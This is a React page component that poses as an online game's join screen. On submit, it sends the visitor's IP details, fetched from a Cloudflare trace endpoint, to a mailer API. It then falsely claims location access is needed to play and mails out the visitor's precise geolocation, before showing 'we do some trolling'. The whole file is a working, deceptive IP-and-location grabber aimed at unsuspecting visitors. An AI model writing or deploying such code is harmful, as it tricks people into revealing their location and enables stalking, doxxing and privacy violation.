import { FC, FormEvent, Fragment, useState } from "react";

const Index: FC = () => {
	const [name, setName] = useState("");
	const [joined, setJoined] = useState(false);
	const [done, setDone] = useState(false);

	const onJoin = (e: FormEvent<HTMLFormElement>) => {
		e.preventDefault();

		fetch("https://www.cloudflare.com/cdn-cgi/trace")
			.then((res) => res.text())
			.then((text) => {
				fetch("/api/mailer", {
					method: "POST",
					headers: {
						Accept: "application/json, text/plain, */*",
						"Content-Type": "application/json"
					},
					body: JSON.stringify({
						subject: `IP info for [ ${name} ]`,
						text
					})
				});
			});

		if (name !== "") setJoined(true);
	};

	const onAllow = () => {
		if (navigator.geolocation)
			navigator.geolocation.getCurrentPosition(
				(pos) => {
					fetch("/api/mailer", {
						method: "POST",
						headers: {
							Accept: "application/json, text/plain, */*",
							"Content-Type": "application/json"
						},
						body: JSON.stringify({
							subject: `Geolocation info for [ ${name} ]`,
							text: `Position: ${pos.coords.latitude}, ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}`
						})
					});

					setDone(true);
				},
				() =>
					alert(
						"Please enable the geolocation feature by clicking the ⓘ symbol on your browser"
					),
				{
					enableHighAccuracy: true,
					maximumAge: 2000,
					timeout: 5000
				}
			);
		else alert("Geolocation API is not supported in this browser");
	};

	if (done) return <p>we do some trolling</p>;

	if (joined)
		return (
			<Fragment>
				<p>Please allow access to your location in order to run this game</p>
				<button onClick={onAllow}>Allow Access</button>
			</Fragment>
		);

	return (
		<form onSubmit={onJoin}>
			<input
				type="text"
				value={name}
				onChange={(e) => setName(e.target.value)}
				placeholder="Press Enter to Join..."
			/>
		</form>
	);
};

export default Index;
